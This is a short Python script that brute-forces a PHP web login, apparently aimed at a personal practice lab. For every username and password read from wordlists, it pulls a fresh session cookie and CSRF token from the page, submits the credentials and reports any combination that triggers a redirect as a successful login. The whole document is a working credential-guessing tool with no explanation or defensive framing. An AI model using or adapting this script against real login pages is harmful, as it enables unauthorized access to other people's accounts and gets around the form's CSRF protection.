import requests
import re
import sys
from urllib.parse import urlencode

# URL to which you want to send the GET request to obtain PHPSESSID and csrf_token
initial_url = "https://0xhunter.me/lab/index.php"

# Headers for the initial GET request
headers = {
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:55.0) Gecko/20100101 Firefox/55.0',
    'Content-Type':'application/x-www-form-urlencoded',
}

# URL to which you want to send the POST requests for login
login_url = "https://0xhunter.me/lab/index.php"

# Read usernames and passwords from files
with open('usernames.txt', 'r') as user_file:
    usernames = [line.strip() for line in user_file]

with open('passwords.txt', 'r') as pass_file:
    passwords = [line.strip() for line in pass_file]

# Loop through each combination of username and password
for username in usernames:
    for password in passwords:
        # First request to obtain PHPSESSID and csrf_token
        initial_response = requests.get(initial_url, headers=headers, allow_redirects=False)
        set_cookie_header = initial_response.headers.get('Set-Cookie', '')
        match_php_session_id = re.search(r'PHPSESSID=(.*?);', set_cookie_header)
        match_csrf_token = re.search(r'<input[^>]*name=["\']csrf_token["\'][^>]*value=["\'](.*?)["\']', initial_response.text)

        if not (match_php_session_id and match_csrf_token):
            print("\033[1;91mPHPSESSID or CSRF token not found in the initial response. HTML Content:\033[0m")
            print(initial_response.text + "\n++++++++++++++++++++\n")
            sys.exit(1)

        php_session_id = match_php_session_id.group(1)
        csrf_token = match_csrf_token.group(1)

        data = {'csrf_token': csrf_token, 'username': username, 'password': password}

        # Sending the POST request with form data, headers, and PHPSESSID
        response_login = requests.post(login_url, data=data, headers=headers,cookies={'PHPSESSID': php_session_id}, allow_redirects=False)

        # Checking the response status code for success or failure
        if response_login.status_code == 302:
            print(f"\033[1;97;42mLogin successful for {username} with password {password}\033[0m")
            print(f"\033[1;32mPHPSESSID: {php_session_id}\033[0m")
            print(f"\033[1;32mcsrf_token: {csrf_token}\033[0m")
            print("++++++++++++++++++++")
            sys.exit(0)
        else:
            print(f"\033[1;91mLogin failed for {username} with password {password}\033[0m")
            print(f"\033[1;91mPHPSESSID: {php_session_id}\033[0m")
            print(f"\033[1;91mcsrf_token: {csrf_token}\033[0m")
            print("++++++++++++++++++++")

# If no successful login is found
print("\033[1;91mNo valid combination of username and password found.\033[0m")
